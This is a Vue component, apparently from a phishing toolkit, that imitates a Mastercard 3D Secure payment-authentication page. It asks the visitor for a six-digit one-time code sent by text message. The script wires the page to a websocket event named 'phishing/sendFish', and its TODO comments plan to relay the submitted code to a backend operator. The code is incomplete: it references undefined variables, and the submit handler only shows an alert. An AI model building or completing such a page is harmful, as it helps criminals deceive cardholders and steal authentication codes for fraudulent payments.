<template>
  <div class="payment-auth-container">
    <div class="payment-auth-card">

      <header class="card-header">
        <div class="logo-placeholder"></div>
        <img src="@/assets/img/mastercard-logo.png" class="gateway-logo" />
      </header>

      <main class="card-body">
        <h2 class="title">Payment authentication</h2>

        <div class="payment-summary">
          <p class="summary-text">You are authorizing a payment of</p>
          <p class="summary-amount">
            <span class="amount-value">$99.00</span>
            <span class="amount-detail">to **SecureBank** on 27/02/24</span>
          </p>
        </div>

        <p class="verification-info">
          We have sent you a text message with a code to your registered mobile number ending in **7878.
        </p>

        <h3 class="input-label">Enter authentication code</h3>
        <input
            v-model="authCode"
            type="text"
            placeholder="Enter 6-digit code"
            class="code-input"
            maxlength="6"
            @input="validateInput"
        >

        <button
            @click="submitCode"
            :disabled="!isCodeValid"
            class="submit-button"
        >
          SUBMIT
        </button>
        <button
            @click="resendCode"
            class="resend-button"
        >
          RESEND CODE
        </button>

        <details class="why-seeing-this">
          <summary class="why-seeing-this-summary">
            Why am I seeing this?
            <span class="dropdown-arrow"></span>
          </summary>
          <p class="why-seeing-this-content">
            3D Secure authentication provides an additional layer of security for online transactions. This verification process helps protect your card from unauthorized use by requiring you to enter a one-time password sent to your registered mobile device.
          </p>
        </details>
      </main>
    </div>
  </div>
</template>

<script lang="ts" setup>
import { ref, computed ,onBeforeUnmount, onMounted} from 'vue';
import { addOnMessage, removeOnMessage, sendMsg } from '~/utils';
import type { WebSocketMessage } from '~/utils';
import { format } from 'date-fns';

interface Message {
  type: Enum;
  content: string;
  time: string;
}
const messageEvent = 'websocket/addons/phishing/sendFish';



// 验证码输入框的值
const authCode = ref('');
const mobile = ref("7878");
const bank = ref("Bank of America");
const money = ref("$250.00");
const date = ref("10/24/2024");

// 获取连接参数
// console.log(window.location.search);

// TODO 1. 直接loading，传送参数给后端，等后端通知，展示不同页面
// TODO 2. 提交验证码，发送给后端，等待下一步动作


// 验证码是否有效的计算属性 (假设是6位数字)
const isCodeValid = computed(() => {
  return authCode.value.length === 6 && /^\d+$/.test(authCode.value);
});

// 仅允许输入数字 (可选，但推荐用于更好的用户体验)
const validateInput = () => {
  // 移除所有非数字字符
  authCode.value = authCode.value.replace(/\D/g, '');
  // 限制长度为6
  if (authCode.value.length > 6) {
    authCode.value = authCode.value.slice(0, 6);
  }
};

// 提交按钮逻辑
const submitCode = () => {
  if (isCodeValid.value) {
    console.log('提交验证码:', authCode.value);
    alert(`正在提交验证码: ${authCode.value}`);
    // 在实际应用中，这里会调用 API
  } else {
    alert('请输入有效的6位验证码。');
  }
};

// 重新发送代码逻辑
const resendCode = () => {
  console.log('重新发送代码');
  alert('重新发送代码...');
  // 在实际应用中，这里会调用 API
};


function sendMessage() {
  if (inputMessage.value == '') {
    return;
  }

  // 发送消息
  sendMsg(messageEvent, {
    message: inputMessage.value,
  });

  const msg: Message = {
    type: Enum.SendType,
    content: inputMessage.value,
    time: format(new Date(), 'yyyy-MM-dd HH:mm:ss'),
  };
  insertMessage(msg);
  inputMessage.value = '';
}

const onMessage = (res: WebSocketMessage) => {
  const msg: Message = {
    type: Enum.ReceiveType,
    content: res.data.message,
    time: format(new Date(), 'yyyy-MM-dd HH:mm:ss'),
  };
  insertMessage(msg);
};

onMounted(() => {
  // 在当前页面注册消息监听
  addOnMessage(testMessageEvent, onMessage);
});

onBeforeUnmount(() => {
  // 移除消息监听
  removeOnMessage(testMessageEvent);
});
</script>

<style scoped>
/* ---------------------------------------------------- */
/* 全局容器样式                      */
/* ---------------------------------------------------- */

.payment-auth-container {
  /* 限制最大宽度和居中 */
  max-width: 750px;
  margin: 0 auto;
  padding: 15px; /* 增加内边距以适应小屏幕 */
  box-sizing: border-box;
  background-color: #f5f5f5; /* 模拟页面背景色 */
  min-height: 100vh; /* 确保在小屏幕上也能看到背景 */
}

.payment-auth-card {
  background-color: #ffffff;
  border-radius: 8px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
  padding: 20px;
  font-family: Arial, sans-serif;
}

/* ---------------------------------------------------- */
/* 头部样式                        */
/* ---------------------------------------------------- */

.card-header {
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
  margin-bottom: 25px;
}

.logo-placeholder {
  width: 50px;
  height: 35px;
  background-color: #A31A3E; /* 模拟左上角红色抽象 logo */
  border-radius: 4px;
}

.gateway-logo {
  width: 90px; /* 调整 logo 大小 */
  height: auto;
}

/* ---------------------------------------------------- */
/* 主要内容样式                     */
/* ---------------------------------------------------- */

.title {
  font-size: 1.25rem; /* 20px */
  font-weight: 600;
  color: #333;
  margin-bottom: 20px;
}

/* 支付信息区域 */
.payment-summary {
  padding: 15px;
  border: 1px solid #e0e0e0;
  border-radius: 4px;
  margin-bottom: 20px;
}

.summary-text {
  font-size: 0.9rem; /* 14.4px */
  color: #666;
  margin-bottom: 5px;
}

.summary-amount {
  display: flex;
  flex-wrap: wrap; /* 小屏幕换行 */
  align-items: baseline;
}

.amount-value {
  font-size: 1.8rem; /* 28.8px */
  font-weight: 700;
  color: #333;
  margin-right: 10px;
}

.amount-detail {
  font-size: 0.9rem; /* 14.4px */
  color: #666;
}

.verification-info {
  font-size: 0.9rem;
  color: #555;
  margin-bottom: 25px;
}

/* 输入框和标签 */
.input-label {
  font-size: 1rem;
  font-weight: 600;
  color: #333;
  margin-bottom: 10px;
}

.code-input {
  width: 100%;
  padding: 12px;
  font-size: 1.1rem;
  border: 1px solid #ccc;
  border-radius: 4px;
  margin-bottom: 15px;
  text-align: center;
  box-sizing: border-box; /* 确保 padding 不增加总宽度 */
  /* 隐藏移动端数字键盘的箭头 */
  -moz-appearance: textfield;
}

.code-input::-webkit-outer-spin-button,
.code-input::-webkit-inner-spin-button {
  -webkit-appearance: none;
  margin: 0;
}


/* 按钮样式 */
.submit-button,
.resend-button {
  width: 100%;
  padding: 12px;
  font-size: 1rem;
  font-weight: 600;
  border-radius: 4px;
  cursor: pointer;
  transition: background-color 0.2s;
  margin-bottom: 10px;
  box-sizing: border-box;
}

.submit-button {
  background-color: #66BB6A; /* 绿色 */
  color: #ffffff;
  border: none;
}

.submit-button:not(:disabled):hover {
  background-color: #55a859;
}

.submit-button:disabled {
  background-color: #A5D6A7; /* 禁用时的浅绿色 */
  cursor: not-allowed;
}

.resend-button {
  background-color: transparent;
  color: #333;
  border: 1px solid #ccc;
  margin-bottom: 30px;
}

.resend-button:hover {
  background-color: #f0f0f0;
}

/* 为什么看到这个（Details/Summary）区域 */
.why-seeing-this {
  border-top: 1px solid #e0e0e0;
  padding-top: 15px;
}

.why-seeing-this-summary {
  font-weight: 500;
  color: #333;
  cursor: pointer;
  display: flex;
  justify-content: space-between;
  align-items: center;
  /* 隐藏默认的 details 箭头 */
  list-style: none;
}

.why-seeing-this-summary::-webkit-details-marker {
  display: none;
}

.dropdown-arrow {
  /* 使用 CSS 绘制的自定义下拉箭头 */
  width: 0;
  height: 0;
  border-left: 5px solid transparent;
  border-right: 5px solid transparent;
  border-top: 6px solid #666;
  margin-left: 10px;
  transition: transform 0.2s;
}

/* details 展开时旋转箭头 */
.why-seeing-this[open] .dropdown-arrow {
  transform: rotate(180deg);
}

.why-seeing-this-content {
  margin-top: 10px;
  padding-left: 0;
  font-size: 0.85rem;
  line-height: 1.4;
  color: #555;
}

/* ---------------------------------------------------- */
/* 响应式布局样式                    */
/* ---------------------------------------------------- */

/* 针对小屏幕（例如手机）的优化 */
@media (max-width: 480px) {
  .payment-auth-card {
    padding: 15px; /* 减小内边距 */
  }

  .summary-amount {
    flex-direction: column; /* 小屏幕上金额和详情垂直堆叠 */
    align-items: flex-start;
  }

  .amount-value {
    font-size: 1.6rem; /* 适当减小字体 */
    margin-right: 0;
    margin-bottom: 5px;
  }

  .gateway-logo {
    width: 80px; /* 进一步减小 logo 大小 */
  }
}
</style>